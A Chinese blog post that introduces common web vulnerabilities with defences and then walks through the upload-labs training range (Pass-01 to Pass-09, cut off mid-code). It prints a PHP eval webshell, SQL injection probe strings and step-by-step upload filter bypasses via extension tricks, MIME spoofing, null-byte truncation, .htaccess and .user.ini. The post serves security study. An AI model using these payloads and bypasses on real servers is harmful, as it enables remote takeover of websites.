---
title: Web漏洞靶场练习(不定时更新)
date: 2025-11-02T15:00:00+08:00
tags:
  - "靶场练习"
categories:
  - "漏洞靶场"
description: Web漏洞靶场练习
showToc: true
draft: false
tocOpen: true
---
# 初识漏洞

## 一、SQL注入漏洞

[SQL注入实战指南-CSDN博客](https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501)

SQL注入攻击（SQL Injection）



SQL注入原理：

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。



SQL注入点判断  
1.`?id=1 and 1=1 `和`?id=1 and 1=2`进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。

```plain
SELECT * FROM users WHERE id=1 and 1=2
```

2.`?id=1' and 1=1--+/#`和`?id=1' and 1=2--+/#`进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。

```plain
SELECT * FROM users WHERE id='1' and 1=2-- '
```

3.`?id=1'and 1=1 and '1'='1`和`?id=1'and 1=1 and '1'='1`进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。

```plain
SELECT * FROM users WHERE id='1' and 1=2 and '1'='1'
```

4.`?id=1%' and 1=1 and '%'='%`和`?id=1%' and 1=2 and '%'='%`进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。

```plain
SELECT * from table where users like '%1 %' and '1'='1' and '%'='%'
```

5.`?id=1%' and 1=1--+/#`和`?id=1%' and 1=2--+/#`进行测试如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。



通常情况下，SQL注入的位置包括：   
（1）表单提交，主要是POST请求，也包括GET请求；   
（2）URL参数提交，主要为GET请求参数；   
（3）Cookie参数提交；   
（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；   
（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。   
常见的防范方法   
（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。   
（2）对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。   
（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。   
（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。   
（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。   
（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。   
（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。   
（8）在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。



## 二、跨站脚本漏洞-XSS
跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。   
XSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。   
XSS类型包括：   
（1）非持久型跨站：即反射型跨站脚本漏洞，是目前最普遍的跨站类型。跨站代码一般存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码不存储到服务端（比如数据库中）。上面章节所举的例子就是这类情况。   
（2）持久型跨站：这是危害最直接的跨站类型，跨站代码存储于服务端（比如数据库中）。常见情况是某用户在论坛发贴，如果论坛没有过滤用户输入的Javascript代码数据，就会导致其他浏览此贴的用户的浏览器会执行发贴人所嵌入的Javascript代码。   
（3）DOM跨站（DOM XSS）：是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。   
常用的防止XSS技术包括：   
（1）与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。   
（2）不仅要验证数据的类型，还要验证其格式、长度、范围和内容。   
（3）不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。   
（4）对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。   
（5）在发布应用程序之前测试所有已知的威胁。

## 三、弱口令漏洞
弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。



设置密码通常遵循以下原则：   
（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。   
（2）口令长度不小于8个字符。   
（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。   
（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。   
（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。   
（6）口令不应该为用数字或符号代替某些字母的单词。   
（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。   
（8）至少90天内更换一次口令，防止未被发现的入侵者继续使用该口令。

## 四、HTTP报头追踪漏洞
HTTP/1.1（RFC2616）规范定义了HTTP TRACE方法，主要是用于客户端通过向Web服务器提交TRACE请求来进行测试或获得诊断信息。当Web服务器启用TRACE时，提交的请求头会在服务器响应的内容（Body）中完整的返回，其中HTTP头很可能包括Session Token、Cookies或其它认证信息。攻击者可以利用此漏洞来欺骗合法用户并得到他们的私人信息。该漏洞往往与其它方式配合来进行有效攻击，由于HTTP TRACE请求可以通过客户浏览器脚本发起（如XMLHttpRequest），并可以通过DOM接口来访问，因此很容易被攻击者利用。   
防御HTTP报头追踪漏洞的方法通常禁用HTTP TRACE方法。

## 五、Struts2远程命令执行漏洞
ApacheStruts是一款建立Java web应用程序的开放源代码架构。Apache Struts存在一个输入过滤错误，如果遇到转换错误可被利用注入和执行任意Java代码。   
网站存在远程代码执行漏洞的大部分原因是由于网站采用了Apache Struts Xwork作为网站应用框架，由于该软件存在远程代码执高危漏洞，导致网站面临安全风险。CNVD处置过诸多此类漏洞，例如：“GPS车载卫星定位系统”网站存在远程命令执行漏洞(CNVD-2012-13934)；Aspcms留言本远程代码执行漏洞（CNVD-2012-11590）等。   
修复此类漏洞，只需到Apache官网升级Apache Struts到最新版本：[http://struts.apache.org](http://struts.apache.org/)

## 六、文件上传漏洞
文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。   
因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。

## 七、私有IP地址泄露漏洞
IP地址是网络用户的重要标示，是攻击者进行攻击前需要了解的。获取的方法较多，攻击者也会因不同的网络情况采取不同的方法，如：在局域网内使用Ping指令，Ping对方在网络中的名称而获得IP；在Internet上使用IP版的QQ直接显示。最有效的办法是截获并分析对方的网络数据包。攻击者可以找到并直接通过软件解析截获后的数据包的IP包头信息，再根据这些信息了解具体的IP。   
针对最有效的“数据包分析方法”而言，就可以安装能够自动去掉发送数据包包头IP信息的一些软件。不过使用这些软件有些缺点，譬如：耗费资源严重，降低计算机性能；访问一些论坛或者网站时会受影响；不适合网吧用户使用等等。现在的个人用户采用最普及隐藏IP的方法应该是使用代理，由于使用代理服务器后，“转址服务”会对发送出去的数据包有所修改，致使“数据包分析”的方法失效。一些容易泄漏用户IP的网络软件(QQ、MSN、IE等)都支持使用代理方式连接Internet，特别是QQ使用“ezProxy”等代理软件连接后，IP版的QQ都无法显示该IP地址。虽然代理可以有效地隐藏用户IP，但攻击者亦可以绕过代理，查找到对方的真实IP地址，用户在何种情况下使用何种方法隐藏IP，也要因情况而论。

## 八、未加密登录请求
由于Web配置不安全，登陆请求把诸如用户名和密码等敏感字段未加密进行传输，攻击者可以窃听网络以劫获这些敏感信息。建议进行例如SSH等的加密后再传输。

## 九、敏感信息泄露漏洞
SQL注入、XSS、目录遍历、弱口令等均可导致敏感信息泄露，攻击者可以通过漏洞获得敏感信息。针对不同成因，防御方式不同

## 十、CSRF
[http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

+ 原理：利用用户认证状态执行非法请求。
+ 防范：使用 Token 验证、Referer 验证等。





# 靶场练习
# 1、upload-labs
参考资料

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果.

**上传漏洞满足条件**

首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。

其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。

最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。



php一句话木马

```php
<?php
    @eval($_POST[1]);
?>
```

## 绕过方式
### 一、黑名单绕过
黑名单简单来说就是目标程序规定了哪些文件不能上传

1、大小写绕过  
这个没什么好讲的，举个简单的例子，如下

本来需要上传一个名为a.php的木马文件，有时候将文件名改为以下的样子就能绕过一些黑名单限制

```plain
a.PHP
a.Php
a.PhP
```

还有几种组合啊，懒得写了，这种方式还是比较简单的

2、空格绕过  
在讲解空格绕过之前要先给大家讲一个系统层面上的特性

```plain
在系统层面上，当我保存了一个名为a.txt的文件时，当我在文件名 前面或者后面加上一个空格，在保存时在系统层面上是没有空格的，但是在PHP传输的过程中，是可以识别这个空格的，所以也就诞生我们的空格绕过方式
例： 如果目标的黑名单过滤中只有“.php”，而没有“.php ”这样的后缀时，就可以上传时使用burp抓包，在上传的文件名前面或者后面添加空格，再放包就能成功上传，实现绕过
```

3、点号绕过

```plain
这个点号绕过也是系统层面的原理，很空格过滤没什么区别，当你重命名文件名时，如果在 文件后缀名加上一个点，此时保存后系统会在自动过滤末尾的点号
```

使用方法同空格过滤一样，例如上传一个a.php文件，burp抓包将文件名改为“a.php.”，此时放包，如果黑名单检测中没有对“php.”过滤，就能实现绕过

4、::$data绕过

```plain
条件：只适用于windows
```

这里能绕过的原理是因为windows的NTFS文件系统的一个特性，windows都适用

```plain
也就是当我们访问a.php::$data时，也就是相当于访问a.php本身
当我们访问ab:a.php::$data时，也就是访问ab文件夹下的a.php文件本身
```

这个绕过方式的使用和前面两个一样，都是burp抓包改文件名就行了，例如把a.php改为a.php::$data,只要他没有做对应的过滤就能绕过黑名单检测

**注意：**这种方法确实能绕过限制，但是当我们开新标签访问我们上传的文件时会报错，需要把此时url中的::$data删掉才能正常访问  
5、单次过滤绕过  
先来看看下面这一段过滤代码

```plain
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
```

假设我们上传的文件经过这样一次过滤后才能成功上传，初略一看这里的过滤其实还挺多的，但是这里有一个最大的问题——我们上传的文件**只经过了一次**这样的过滤，例如我们上传a.php，burp抓包后修改为“a.php. .”，此时点击放包，处理流程如下

```plain
遇到上面删除文件末尾的点的过滤时， 末尾的点被删除，此时文件名——“a.php. ”
接着往下过滤，遇到首位去空时， 末尾的空格被删除，此时文件名——“a.php.”
接着往下过滤，你会发现它已经过滤完了，它会将此时的结果拿去$deny_ext进行 黑名单检测
```

但是黑名单中“a.php.”能被检测到吗？不能，所以自然就绕过了过滤

```plain
这里的思路就是假如我们已经知道了目标的一个过滤规则，那我们就可以尝试 使用两次对应的过滤来绕过，假如它所有的过滤都只进行一次，那就可以宣布拿下了
```

6、后缀双写绕过  
双写后缀的方式只适合 目标服务器的过滤规则是检测到黑名单后缀时，将文件名中对应后缀删除的情况  
例如服务器检测的黑名单如下

```plain
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
```

```plain
此时我们上传一个a.php文件，服务器会那黑名单中的内容来匹配，匹配到php后，就会把原来的文件名“ a.php”后面的php后缀删掉，此时的文件名——“ a.”，此时这个文件倒是能成功上传，但是已经不会被解析为php了，，这就是整个过滤流程
而我们对应的绕过方式就是——双写后缀绕过
```

条件还是这个服务器只进行了一次过滤，例如我们上传a.php，burp抓包，将文件名改为“a.pphphp”

```plain
进入文件上传流程，识别文件后缀，为“pphphp”。
从左到右识别，当识别当第二位到第四位的php时，即“p phphp”,判定后缀名存在黑名单，将识别到的php删除，后缀中剩下的字符组合后，此时后缀“pphphp”就成了“php”,此时剩下的文件名——“a.php”,程序以为处理完了，没有危害，所以文件成功上传，不进行拦截，即成功绕过
```

a.php文件，自然我们访问时也能以正常php去解析



### 二、白名单绕过
白名单简单来说就是目标程序规定了能上传的后缀名

1、MIME类型检测绕过  
MIME多用途网络邮件扩展类型，可被称为Media type或Content type，它设定某种类型的文件当被浏览器打开的时候需要用什么样的应用程序，多用于HTTP通信和设定文档类型例如HTML。之所以叫多用途网络邮件扩展类型，因为它最早被用于电子邮件系统，后用于浏览器。

常见的类型有：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823149.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823669.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822728.png)

那么在我们抓包的时候，content-type里面的值，就是文件的mime类型，如果后台是根据这个来判断文件类型的，那么就存在mime类型的检测绕过。

**即上传时抓包，将mine类型改为它允许上传的类型即可绕过验证**

2、路径栏00截断绕过  
条件：

php版本< 5.3

php.ini这个配置文件中 magic_quotes_gpc必须为 off

上传路径可控  
必须满足这两个条件才能使用00截断

原理：

0x00是字符串的结束标识符，攻击者可以利用手动添加标识符的方式来将后面的内容弄进行截断，这样标识符后面的内容就能帮我们绕过检测  
实例：

例如一个程序在代码中规定只允许上传png,jpg,gif后缀的文件，而我们需要上传一个名为aa.php的一句话木马文件，可以使用如下方法:

1、选中aa.php文件并上传，在上传时使用burp抓包,如下

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822079.png)

2、修改文件保存路径和文件名

最初的保存路径是 ../upload/,文件名是 aa.php,所以经过拼接后 aa.php上传后的相对路径位置是 ../upload/aa.php  
此时我们将文件报错路径修改为“../upload/test.php%00aa.php”。%00是结束符的url编码格式

文件名修改为“aa.jpg”，如下

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823275.png)



此时我们上传的文件最后的路径就会拼接成为——“../upload/test.php%00aa.jpg”，因为过滤规则只对文件名生效，也就是filename参数对应的“aa.jpg”，目标允许jpg文件上传，所以绕过过滤自然是没有问题的

很多人会问，那我们上传的aa.php中的一句话木马内容在哪去了？自然也就是在test.php里面去了。因为%00后面的语句不会被识别，所以能成功上传，内容也成功解析为php  
此时访问test.php就能成功访问我们上传的php文件内容







## 靶场练习
### Pass-01-禁用JS
目标：绕过文件上传限制，成功上传一个webshell(是一种恶意脚本或程序)并执行。

创建一个 PHP 文件

```php
<?php @eval($_POST['cmd']); ?>
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823877.png)

尝试上传

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823380.png)

分析代码这是一个js拦截

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

方法一：直接禁用浏览器的js

（1）火狐：地址栏输入about:config  
            搜索栏搜javascript.enabled  
为ture是为开启JavaScript为false时为关闭JavaScript

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824428.png)

（2）右键---检查---调试器---设置---禁用JavaScript

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824981.png)

（3）扩展

方法二：删除checkFile()函数

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824911.png)

测试成功：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824460.png)



### Pass-02-MIME类型
MIME类型：浏览器通过

```plain
 $_FILES['file']['type']
```

发送文件的MIME类型(如image/jpeg)，但完全由客户端控制，攻击者可通过修改 HTTP 请求伪造此值

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {//
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

使用burp抓包

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824258.png)

修改content-type(是向服务器告知传输的是什么文件)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824502.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png)

复制图片链接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png)

验证通过

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825147.png)





### Pass-03-后缀伪造绕过
###### 前置条件：
1.切换版本

[记录BUG—在uploadlabs第三关中—关于phpstudy中修改httpd.conf依旧无法解析.php3d等问题_upload-labs无法解析php3-CSDN博客](https://blog.csdn.net/qq_43696276/article/details/126445465)





修改后缀来绕过检查，例如修改为".php3",".php5"

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825852.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825443.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825722.png)



### Pass-04-`.htaccess` 配置解析绕过
###### 前置条件：
1.`mod_rewrite`模块开启。

（1）打开`httpd.conf`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825083.png)

（2）检查`#LoadModule rewrite_module modules/mod_rewrite.so`，去掉前面的`#`

若没有`LoadModule rewrite_module modules/mod_rewrite.so`，可以随便找一个LoadModule语句的附近添加

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931287.png)

（3）确保`mod_rewrite.so`文件存在

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931712.png)

（4）配置`.htaccess`支持

打开`httpd.conf`，搜索找到`AllowOverride`，将后面的NONE改为ALL，保险起见，俩处都改。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931226.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931817.png)

（5）在`httpd.conf`文件的末尾添加以下内容，确保`RewriteEngine`已启用：

```plain
<IfModule mod_rewrite.c>
    RewriteEngine On
</IfModule>
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931662.png)

（6）保存！！！保存！！！保存！！！

（7）测试

在网站根目录`www`下创建一个`.htaccess`文件，写入以下内容：

```plain
RewriteEngine On
RewriteRule ^test$ index.php [L]
```

然后访问`http://域名/test`，如果跳转到`index.php`，说明`mod_rewrite`已启用。

2.`.htaccess`

`.htaccess` 是一个配置文件，主要用于 Apache 服务器。它放在网站的某个目录里，用来控制该目录及其子目录的行为。





新建一个`.htaccess`文件，注意：**.htaccess文件不能有文件名，否则不运行！！！**

```plain
AddType application/x-httpd-php .jpg .txt
//这行代码的意思是让服务器把 .jpg 和 .txt 文件当作 PHP 脚本来执行。
//AddType 是 .htaccess 中的一个指令，用来指定文件类型和处理方式。
//application/x-httpd-php 是 PHP 文件的 MIME 类型，表示用 PHP 解析器处理这些文件。
//.jpg .txt 是文件扩展名，表示对这两种文件应用该规则。
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931923.png)

上传`.htaccess`文件

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931269.png)

之后上传一句话木马图片（图片可以直接由php文件改后缀名为jpg）

链接成功

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931523.png)



### Pass-05- `.user.ini` 自动包含绕过
###### 前置条件：
1.`.user.ini` 是一个配置文件，它类似于 `.htaccess`，但专门用于配置 PHP 的行为。可以把它放在网站的某个目录中，用来覆盖服务器的主 PHP 配置（`php.ini`），在不修改服务器全局配置的情况下，灵活调整 PHP 的行为。

2.切换版本

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931309.png)





写一个`.user.ini`配置文件，上传到服务器，

```plain
auto_prepend_file=1.txt
// PHP 在执行每个脚本之前，自动预加载指定的文件1.txt。
具体解释
auto_prepend_file：这是一个 PHP 配置选项，用于指定一个文件路径。PHP 会在执行每个脚本之前，先加载并运行这个文件。
1.txt：这是你指定的文件路径。PHP 会尝试加载这个文件，并将其内容作为 PHP 代码执行。
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932348.png)

再上传一个`1.txt`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932332.png)

在蚁剑中输入url时，最后一项不要写1.txt，而是readme.php，这个文件是靶场自带的一个php文件，而你的.user.ini文件中写的就是启动php文件的时候启动1.txt，所以要启动的是readme.php

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932536.png)





### Pass-06_大小写绕过
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

Windows系统对大小写并不敏感，而这个检测机制它是区分大小写的，所以我们只需要随机让几个字母大小写互换即可。



切换版本！

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932010.png)

使用BP抓包，将文件后缀名的小写变成大写

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932497.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932202.png)







### Pass-07_空格绕过
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



抓包加空格

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932479.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932081.png)





### Pass-08_点绕过
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

加点

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021933068.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932765.png)



### Pass-09_`::$DATA`绕过
原理:Windows系统下，如果上传的文件名是`test.php::$DATA`，会在服务器上生成一个`test.php`的文件，其中内容和所上传文件内容相同。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
